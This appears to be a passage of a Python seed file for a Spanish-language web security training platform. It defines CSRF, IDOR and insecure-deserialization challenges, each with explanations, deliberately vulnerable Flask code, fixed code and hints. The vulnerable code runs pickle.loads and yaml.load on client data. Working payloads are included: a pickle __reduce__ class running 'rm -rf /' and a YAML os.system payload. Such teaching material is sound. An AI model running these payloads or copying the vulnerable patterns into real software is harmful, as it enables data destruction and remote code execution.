1. Usa Flask-WTF que genera tokens CSRF automáticamente
2. Token único por sesión y validado en cada solicitud POST
3. Validación @csrf.protect en el endpoint
4. Re-autenticación para operaciones críticas
5. SameSite=Lax en cookies
6. Logging de auditoría
7. Validación de datos del formulario
        """,
        
        "hint_1": """
Pista 1: El problema es que la aplicación solo verifica que el usuario esté logueado.
¿Cómo podrías saber que la solicitud viene de una página legítima y no de un sitio malicioso?
        """,
        
        "hint_2": """
Pista 2: Necesitas un token secreto que solo tu aplicación conoce.
Este token debe incluirse en CADA formulario y validarse en servidor.
Atacantes no pueden adivinarlo.
        """,
        
        "hint_3": """
Pista 3: También configura cookies con SameSite=Strict/Lax para que
el navegador NO incluya cookies en solicitudes cross-site.
        """,
        
        "test_endpoint": "/transfer",
        "test_payload": '{"to_account": "attacker", "amount": 10000}',
        "expected_result": "Transfer executes (CSRF vulnerability)"
    },
    
    {
        "title": "Insecure Direct Object Reference (IDOR)",
        "short_title": "IDOR - Authorization Bypass",
        "description": "Descubre cómo acceder a recursos de otros usuarios modificando parámetros. Aprende sobre autorización correcta.",
        "difficulty": DifficultyLevel.INTERMEDIATE,
        "vulnerability_type": VulnerabilityType.IDOR,
        "attack_type": AttackType.AUTHORIZATION,
        "icon": "🚪",
        "color": "cyan",
        "difficulty_order": 5,
        "cvss_score": 7.5,
        "owasp_top_10": "A01:2021",
        "cwe_id": "CWE-639",
        "cwe_description": "Authorization Bypass Through User-Controlled Key",
        
        "vulnerability_explanation": """
IDOR ocurre cuando la aplicación usa referencias directas a objetos (IDs, nombres)
sin validar que el usuario tiene permiso para acceder.

Ejemplo:
- URL: /user/123/profile
- Usuario logueado accede a su perfil: /user/123/profile
- Atacante cambia a /user/124/profile y accede al perfil de otro usuario

La raíz: No verificar autorización antes de devolver datos.
        """,
        
        "attack_explanation": """
Ejemplo de ataque IDOR:

1. Atacante se logue en aplicación: /user/500/profile
   - Ve su información personal

2. Cambia ID en URL: /user/1/profile
   - Accede al perfil del usuario 1 (admin)
   - Ve email, teléfono, datos personales

3. Intenta cambiar ID: /user/999/profile
   - Accede a 999 usuarios diferentes

4. Escalada:
   - /api/users/1/orders - Ve órdenes de otros
   - /api/invoices/5000 - Accede a factura de otro cliente
   - /api/admin/2/permissions - Ver permisos de admin

Variantes:
- IDs secuenciales: fácil de enumerar
- UUIDs: más difícil pero posible si expuestos
- Nombres de archivo: /uploads/user_1.pdf, user_2.pdf
- Referencias de BD: /reports/customer_id=123
        """,
        
        "real_world_impact": """
Ataques IDOR conocidos:
- **Facebook (2013)**: Acceso a fotos privadas de 100M+ usuarios
- **Uber (2017)**: Acceso a datos de conductores y riders
- **Grindr (2018)**: Exposición de ubicación de 3.6M usuarios
- **Twitter**: Acceso a datos de usuarios privados

Impacto:
- Exposición de datos personales
- Información financiera
- Documentos médicos/legales
- Direcciones de casa
- Historial de compras
- Robo de identidad
        """,
        
        "countermeasures": """
Prevención de IDOR:

1. **Autorización en servidor**:
   - SIEMPRE verificar que usuario autenticado puede acceder
   - Usar lista blanca, no lista negra
   - Comparar user_id en sesión con recurso

2. **Usar IDs opacos**:
   - UUIDs en lugar de integers
   - Hashes de IDs
   - Tokens específicos de usuario

3. **Validar acceso a nivel de datos**:
   - En modelo/ORM: scope queries a usuario actual
   - En API: verificar en cada endpoint

4. **Implementar roles y permisos**:
   - Admin vs User vs Viewer
   - Permisos granulares
   - Verificar en cada operación

5. **Logging y monitoreo**:
   - Detectar patrones de enumeración
   - Alertar de acceso inusual
   - Auditoría de datos accedidos

6. **Minimizar exposición de IDs**:
   - No mostrar IDs en URLs si es posible
   - Usar guids
   - Ofuscación (débil, no es seguridad)
        """,
        
        "best_practices": """
✓ Verificar autorización en CADA endpoint
✓ Usar session.user_id, no confiar en request.user_id
✓ IDs opacos (UUID en lugar de 1,2,3)
✓ Query scope: Model.filter(user_id=session.user_id)
✓ Tests de autorización en cada change
✓ Usar framework con helpers de autorización
✓ Logging de acceso a datos sensibles
✓ Code review: auditar cada GET/POST de datos
✓ Penetration testing: enumerar IDs
✓ Principle of Least Privilege
        """,
        
        "learning_objectives": """
Aprenderás:
- Diferencia entre autenticación y autorización
- Cómo verificar permisos correctamente
- IDOR y acceso no autorizado
- Enumeración de IDs
- Testing de autorización
- Implementación de roles/permisos
        """,
        
        "references": """
- OWASP IDOR: https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference
- CWE-639: https://cwe.mitre.org/data/definitions/639.html
- PortSwigger IDOR: https://portswigger.net/web-security/access-control/idor
        """,
        
        "vulnerable_code": """
// ❌ CÓDIGO VULNERABLE
from flask import Flask, request, jsonify, session

app = Flask(__name__)

@app.route('/api/user/<int:user_id>/profile', methods=['GET'])
def get_user_profile(user_id):
    # ⚠️ FALLA: Solo verifica que usuario esté logueado
    if 'user_id' not in session:
        return jsonify({"error": "Not authenticated"}), 401
    
    # ⚠️ CRÍTICO: No verifica que el usuario logueado sea igual a user_id
    # Cualquier usuario logueado puede acceder a ANY user_id
    user = get_user_from_db(user_id)
    
    if not user:
        return jsonify({"error": "User not found"}), 404
    
    # Devuelve todos los datos sin autorizar
    return jsonify({
        "id": user.id,
        "email": user.email,
        "phone": user.phone,
        "address": user.address,
        "ssn": user.ssn,  # ⚠️ Datos sensibles expuestos
        "credit_card": user.credit_card
    })

@app.route('/api/user/<int:user_id>/orders', methods=['GET'])
def get_user_orders(user_id):
    # ⚠️ Mismo problema - acceso sin verificar autorización
    if 'user_id' not in session:
        return jsonify({"error": "Not authenticated"}), 401
    
    orders = Order.query.filter_by(user_id=user_id).all()
    
    return jsonify([{
        "id": order.id,
        "total": order.total,
        "items": order.items,
        "card_used": order.card_last_4
    } for order in orders])
        """,
        
        "vulnerable_code_language": "python",
        
        "vulnerable_code_explanation": """
El código es vulnerable porque:
1. Solo valida que usuario esté autenticado, NO que sea autorizado
2. No compara session.user_id con user_id del parámetro
3. Devuelve TODOS los datos del usuario
4. Enumerar user_id: 1, 2, 3, ... accede a todos los perfiles
5. Mismo problema en todos los endpoints
        """,
        
        "secure_code": """
// ✅ CÓDIGO SEGURO
from flask import Flask, request, jsonify, session
from functools import wraps

app = Flask(__name__)

def require_authorization(f):
    """Decorador para verificar autorización"""
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'user_id' not in session:
            return jsonify({"error": "Not authenticated"}), 401
        
        requested_user_id = kwargs.get('user_id')
        
        # ✓ CRÍTICO: Verificar que usuario logueado == usuario solicitado
        if session['user_id'] != requested_user_id:
            return jsonify({"error": "Unauthorized"}), 403
        
        return f(*args, **kwargs)
    return decorated

@app.route('/api/user/<int:user_id>/profile', methods=['GET'])
@require_authorization
def get_user_profile(user_id):
    # ✓ En este punto, ya sabemos que session.user_id == user_id
    
    user = User.query.filter_by(id=user_id).first()
    
    if not user:
        return jsonify({"error": "User not found"}), 404
    
    # ✓ Devuelve solo información NO sensible
    return jsonify({
        "id": user.id,
        "username": user.username,
        "name": user.name,
        # ✗ NO incluir: email (privado), phone, ssn, credit_card
    })

@app.route('/api/user/<int:user_id>/orders', methods=['GET'])
@require_authorization
def get_user_orders(user_id):
    # ✓ Autorización verificada por decorador
    
    # ✓ Query scope: solo órdenes del usuario autenticado
    orders = Order.query.filter_by(user_id=user_id).all()
    
    # ✓ Devuelve datos limitados
    return jsonify([{
        "id": order.id,
        "date": order.created_at.isoformat(),
        "total": order.total,
        "status": order.status
        # ✗ NO incluir: card_last_4, payment_method
    } for order in orders])

@app.route('/api/user/<int:user_id>/settings', methods=['PUT'])
@require_authorization
def update_user_settings(user_id):
    # ✓ Autorización verificada
    
    data = request.json
    user = User.query.filter_by(id=user_id).first()
    
    # ✓ Solo permite cambiar ciertos campos
    allowed_fields = ['language', 'timezone', 'notifications']
    
    for field in data:
        if field not in allowed_fields:
            return jsonify({"error": f"Cannot modify {field}"}), 400
        
        setattr(user, field, data[field])
    
    db.session.commit()
    return jsonify({"status": "updated"})
        """,
        
        "secure_code_language": "python",
        
        "secure_code_explanation": """
El código es seguro porque:
1. Decorador verifica autorización: session.user_id == user_id solicitado
2. Si NO coinciden, devuelve 403 Forbidden
3. Solo devuelve datos NO sensibles
4. Query scope garantiza resultados solo del usuario actual
5. Especifica qué campos pueden modificarse
6. Logging de acceso a datos
        """,
        
        "hint_1": """
Pista 1: El problema está en la diferencia entre AUTENTICACIÓN (¿eres quién dices?) 
y AUTORIZACIÓN (¿puedes acceder a esto?).

¿Qué falta verificar?
        """,
        
        "hint_2": """
Pista 2: Imagina:
- Yo soy usuario 123
- Mi sesión tiene session.user_id = 123
- Cambio URL a /user/456/profile

¿La aplicación debería permitirlo? ¿Por qué no?
        """,
        
        "hint_3": """
Pista 3: Siempre compara:
  session.user_id (quien está logueado)
  vs
  requested_resource.user_id (de quién es el recurso)

Si no coinciden -> 403 Forbidden
        """,
        
        "test_endpoint": "/api/user/2/profile",
        "test_payload": "GET request while logged in as user 1",
        "expected_result": "Returns user 2 data (IDOR)"
    },
    
    {
        "title": "Insecure Deserialization",
        "short_title": "Insecure Deserialization",
        "description": "Aprende cómo datos serializados maliciosos pueden ejecutar código arbitrario en el servidor. Descubre la deserialización segura.",
        "difficulty": DifficultyLevel.ADVANCED,
        "vulnerability_type": VulnerabilityType.INSECURE_DESERIALIZE,
        "attack_type": AttackType.SERIALIZATION,
        "icon": "⚙️",
        "color": "red",
        "difficulty_order": 6,
        "cvss_score": 9.8,
        "owasp_top_10": "A08:2021",
        "cwe_id": "CWE-502",
        "cwe_description": "Deserialization of Untrusted Data",
        
        "vulnerability_explanation": """
Deserialización insegura ocurre cuando aplicación deserializa datos no confiables
sin validar su estructura.

Esto permite:
- Ejecución de código arbitrario
- Remote Code Execution (RCE)
- DoS mediante bombas de datos
- Manipulación de objetos en memoria

La raíz: Confiar en datos del cliente que se convierten en objetos Python/Java.
        """,
        
        "attack_explanation": """
Ataque de deserialización en Python:

1. Atacante crea payload Python malicioso usando pickle:
```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('rm -rf /',))

payload = pickle.dumps(Exploit())
```

2. Envía payload al servidor

3. Servidor deserializa:
```python
import pickle
data = request.data
obj = pickle.loads(data)  # ⚠️ Ejecuta código malicioso
```

4. Cuando se crea el objeto, __reduce__ se ejecuta
   - os.system('rm -rf /') se ejecuta
   - Sistema destruido

Misma vulnerabilidad en:
- Java: serialización de objetos
- PHP: unserialize()
- YAML: yaml.load() sin Loader
- JSON: (más seguro si solo parse, no ejecuta)

Payloads conocidos:
- ysoserial: Genera payloads para Java
- pickleRPC: Exploits para Python pickle
        """,
        
        "real_world_impact": """
Ataques de deserialización conocidos:
- **Apache Commons Collections**: 15+ CVEs
- **JBoss**: RCE mediante deserialización
- **Facebook/Instagram**: Ejecución de código
- **Ghost CMS**: RCE con YAML deserialization
- **Laravel unserialize**: RCE con POP chains

Impacto:
- Ejecución de código remoto (RCE)
- Full system compromise
- Robo de datos
- Instalación de malware
- Pérdida total de control del servidor
        """,
        
        "countermeasures": """
Prevención de deserialización insegura:

1. **Evitar serialización de objetos**:
   - Usar JSON en lugar de pickle/serialize
   - JSON no ejecuta código

2. **Si DEBES usar serialización**:
   - Firmar datos (HMAC/signatures)
   - Verificar firma antes de deserializar
   - Usar versiones signadas de protocolos

3. **Type checking**:
   - Whitelist de clases permitidas
   - Validar tipo antes de deserializar
   - En Java: readObject() con validación

4. **Alternativas seguras**:
   - JSON Schema validation
   - Protocol Buffers
   - MessagePack
   - Ninguno que ejecute código

5. **Entorno de sandbox**:
   - Ejecutar deserialization en proceso sandbox
   - Capabilities restringidos

6. **Monitoreo**:
   - Detectar payloads conocidos
   - Alert en cambios inesperados
        """,
        
        "best_practices": """
✓ NUNCA usar pickle.loads() en datos no confiables
✓ NUNCA usar yaml.load() sin Loader=yaml.SafeLoader
✓ NUNCA usar unserialize() en PHP
✓ SIEMPRE usar JSON o Protocol Buffers
✓ Si necesitas serialización, FIRMAR los datos
✓ Validar estructura con schema (JSON Schema, Protobuf)
✓ Whitelist de clases permitidas si deserialization necesaria
✓ Update dependencies regularmente
✓ Usar herramientas como ysoserial para testing
✓ Code review de toda serialización
        """,
        
        "learning_objectives": """
Aprenderás:
- Diferencia entre serialización y JSON
- Por qué pickle/yaml son inseguros
- Object injection y RCE
- Firmas y validación de datos
- Protocol Buffers como alternativa
- Testing de deserialización
        """,
        
        "references": """
- OWASP Deserialization: https://owasp.org/www-community/attacks/Deserialization_of_untrusted_data
- CWE-502: https://cwe.mitre.org/data/definitions/502.html
- ysoserial: https://github.com/frohoff/ysoserial
- Python Pickle: https://docs.python.org/3/library/pickle.html
        """,
        
        "vulnerable_code": """
// ❌ CÓDIGO VULNERABLE
from flask import Flask, request, jsonify
import pickle
import yaml

app = Flask(__name__)

@app.route('/api/config', methods=['POST'])
def upload_config():
    # ⚠️ CRÍTICO: Deserializa datos del cliente con pickle
    data = request.data
    
    try:
        # ⚠️ pickle.loads() ejecuta código arbitrario
        config = pickle.loads(data)
    except Exception as e:
        return jsonify({"error": str(e)}), 400
    
    # Guardar config
    save_config(config)
    
    return jsonify({"status": "Config uploaded"})

@app.route('/api/settings', methods=['POST'])
def upload_settings():
    # ⚠️ CRÍTICO: yaml.load() sin SafeLoader
    yaml_data = request.data.decode()
    
    # ⚠️ Ejecuta código Python en el YAML
    settings = yaml.load(yaml_data)  # sin Loader=yaml.SafeLoader
    
    return jsonify({"status": "Settings applied"})

# Atacante envía:
EXPLOIT_PAYLOAD = """
!!python/object/apply:os.system
args: ['touch /tmp/pwned.txt']
"""

# O con pickle:
import os
import pickle

class RCE:
    def __reduce__(self):
        return (os.system, ('touch /tmp/pwned.txt',))

payload = pickle.dumps(RCE())
# POST /api/config con payload
        """,
        
        "vulnerable_code_language": "python",
        
        "vulnerable_code_explanation": """
El código es vulnerable porque:
1. pickle.loads() ejecuta código cuando se deserializa
2. yaml.load() sin SafeLoader ejecuta Python
3. Atacante puede inyectar objetos maliciosos
4. No hay validación ni firma de datos
5. RCE es posible directamente
        """,
        
        "secure_code": """
// ✅ CÓDIGO SEGURO
from flask import Flask, request, jsonify
import json
import hmac
import hashlib
import base64
from cryptography.fernet import Fernet

app = Flask(__name__)
app.config['SECRET_KEY'] = b'your-secret-key-here'

def sign_data(data: bytes, key: bytes) -> str:
    \"\"\"Firmar datos con HMAC\"\"\"
    signature = hmac.new(key, data, hashlib.sha256).digest()
    return base64.b64encode(data + signature).decode()

def verify_signature(signed_data: str, key: bytes) -> bytes:
    \"\"\"Verificar y extraer datos\"\"\"
    try:
        data = base64.b64decode(signed_data)
        payload = data[:-32]  # TODO: datos
        signature = data[-32:]  # Últimos 32 bytes
        
        expected_sig = hmac.new(key, payload, hashlib.sha256).digest()
        
        if not hmac.compare_digest(signature, expected_sig):
            raise ValueError("Signature verification failed")
        
        return payload
    except Exception:
        return None

@app.route('/api/config', methods=['POST'])
def upload_config():
    # ✓ Usar JSON en lugar de pickle
    try:
        data = request.get_json()
    except:
        return jsonify({"error": "Invalid JSON"}), 400
    
    if not data:
        return jsonify({"error": "No data"}), 400
    
    # ✓ Validar estructura con esquema
    required_fields = ['name', 'version', 'settings']
    if not all(f in data for f in required_fields):
        return jsonify({"error": "Missing fields"}), 400
    
    # ✓ Validar tipos
    if not isinstance(data['name'], str) or len(data['name']) > 255:
        return jsonify({"error": "Invalid name"}), 400
    
    if not isinstance(data['settings'], dict):
        return jsonify({"error": "Invalid settings"}), 400
    
    # Procesar JSON seguro
    save_config(data)
    
    return jsonify({"status": "Config uploaded"}), 201

@app.route('/api/settings', methods=['POST'])
def upload_settings():
    # ✓ Usar JSON en lugar de YAML
    try:
        settings_json = request.get_json()
    except:
        return jsonify({"error": "Invalid JSON"}), 400
    
    # ✓ Validar contra schema
    required_keys = ['theme', 'language', 'notifications']
    valid_themes = ['dark', 'light', 'auto']
    
    for key in settings_json:
        if key not in required_keys:
            return jsonify({"error": f"Unknown setting: {key}"}), 400
    
    if 'theme' in settings_json and settings_json['theme'] not in valid_themes:
        return jsonify({"error": "Invalid theme"}), 400
    
    # ✓ Si es YAML crítico, usar SafeLoader:
    # settings = yaml.load(yaml_data, Loader=yaml.SafeLoader)
    
    return jsonify({"status": "Settings applied"}), 200

@app.route('/api/encrypted', methods=['POST'])
def upload_encrypted():
    # ✓ Alternativa: Firmar y encriptar datos
    key = app.config['SECRET_KEY']
    
    try:
        signed_data = request.json['data']
        payload = verify_signature(signed_data, key)
        
        if payload is None:
            return jsonify({"error": "Invalid signature"}), 403
        
        # ✓ Si datos fueron firmados correctamente,
        # podemos confiar en deserializar con seguridad limitada
        
        data = json.loads(payload.decode())
        
    except Exception as e:
        return jsonify({"error": "Decryption failed"}), 400
    
    return jsonify({"status": "Processed"}), 200
        """,
        
        "secure_code_language": "python",
        
        "secure_code_explanation": """
El código es seguro porque:
1. Usa JSON en lugar de pickle/YAML (no ejecuta código)
2. Valida estructura y tipos antes de procesar
3. Whitelist de campos permitidos
4. Valida longitud de strings
5. Alternativa con firma HMAC y encriptación
6. Si YAML es necesario, usa SafeLoader
7. Ninguna ejecución de código posible
        """,
        
        "hint_1": """
Pista 1: pickle.loads() no solo restaura datos - EJECUTA CÓDIGO PYTHON.
¿Qué deberías usar en su lugar?
        """,
        
        "hint_2": """
Pista 2: JSON es seguro porque solo contiene datos, NO código ejecutable.
Cambiar de pickle a JSON elimina la vulnerabilidad.
        """,
        
        "hint_3": """
Pista 3: Si necesitas enviar datos complejos:
1. Usa JSON o Protocol Buffers
2. Firma los datos (HMAC)
3. Valida estructura contra schema
        """,
        
        "test_endpoint": "/api/config",
        "test_payload": "Pickled Python object with __reduce__",
        "expected_result": "Code execution"
    }
]

def load_challenges(db: Session):
    """Cargar desafíos en la base de datos"""
    # Limpiar existentes
    db.query(Challenge).delete()
    db.commit()
    
    for challenge_data in CHALLENGES:
        challenge = Challenge(**challenge_data)
        db.add(challenge)
    
    db.commit()
    print(f"✓ Cargados {len(CHALLENGES)} desafíos educativos")

if __name__ == "__main__":
    db = SessionLocal()
    try:
        load_challenges(db)
        print("✓ Base de datos inicializada correctamente")
    except Exception as e:
        print(f"✗ Error: {e}")
    finally:
        db.close()
